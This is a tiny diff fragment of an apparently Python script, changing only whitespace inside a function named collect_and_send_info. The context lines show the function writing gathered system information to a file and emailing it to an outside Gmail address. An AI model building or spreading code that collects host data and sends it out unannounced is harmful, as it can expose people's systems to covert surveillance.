@@ -229,5 +229,5 @@ def collect_and_send_info():
 
     with open("system_info.txt", "w") as f:
         f.write(system_info)
-
+        
     send_email("system_info.txt", "system_info.txt", "abc@gmail.com")
